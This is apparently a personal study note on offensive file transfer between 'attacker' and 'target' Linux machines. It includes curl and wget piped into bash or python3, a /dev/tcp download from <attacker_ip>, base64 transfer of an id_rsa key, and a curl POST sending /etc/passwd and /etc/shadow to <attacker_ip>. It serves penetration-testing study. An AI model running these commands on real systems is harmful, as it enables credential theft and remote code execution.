---
title: File_Transfer_Methods_Linux
tags:
  - file_sharing
  - linux
created: 2025-02-25
---

# File_Transfer_Methods_Linux

## Description
There are various methods to transfer files between systems using Linux tools and bash

## Download Operations
### Base64 Encode & Decode
#### Encode the file on attacker machine
Encode a file into a Base64 string (useful when transferring via text channels).
```bash
md5sum id_rsa # For checking the file integrity
cat id_rsa | base64 -w 0; echo
    ```

#### Decode the file on target machine
On the target linux machine decode the string back into a file:
```bash
echo -n 'base64string' | base64 -d > id_rsa
```

### Web Downloads with Wget and cURL
#### wget download
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

#### cURL downlaod
`cURL` is very similar to `wget`, but the output filename option is lowercase `-o'.
```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Fileless Attacks Using Linux
Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

>[!NOTE]
>Note: Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

#### Fileless download with wget
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

#### Fileless download with cURL
`cURL` is very similar to `wget`, but the output filename option is lowercase `-o'.
```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

### Download with Bash (/dev/tcp)
There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.
#### Connect to the webserver
```bash
exec 3<>/dev/tcp/<attacker_ip>/80
```
#### HTTP GET request
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
#### Print the Response
```bash
cat <&3
```
### SSH Downloads
SSH is a protocol that allows secure access to remote computers. SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.
```bash
scp <username>@<attacker_ip>:/root/myroot.txt . # on a target machine
```

>[!NOTE]
>You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer. 

## Upload Operations
### Web Upload via HTTPS
we can use uploadserver - extended module of the Python `HTTP.Server` module, which includes a file upload page. For this example let's configure the `uploadserver` module to use `HTTPS` for secure communication.
####  Download python module
```bash
sudo python3 -m pip install --user uploadserver
```

####  Create a self-signed certificate
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# The webserver should not host the certificate.
# Create a new directory to host the file for webserver.
mkdir https && cd https
```

#### Start a web server
```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

#### From a target machine upload multiple files
```bash
curl -X POST https://<attacker_ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Alternative Web File Transfer Method
#### Creating a web server
```bash
python3 -m http.server

python2.7 -m SimpleHTTPServer

php -S 0.0.0.0:8000

ruby -run -ehttpd . -p8000

```

#### Downloading a file from target host to attacker host
```bash
wget <target_ip>:8000/filetotransfer.txt
```

### SSH Upload
Some companies allow the `SSH protocol` for outbound connections. If that's the case, we can use an SSH server with the `scp` utility to upload files
```bash
scp /etc/passwd <target_username>@<target_ip>:/home/directory
```

## Sources
- link
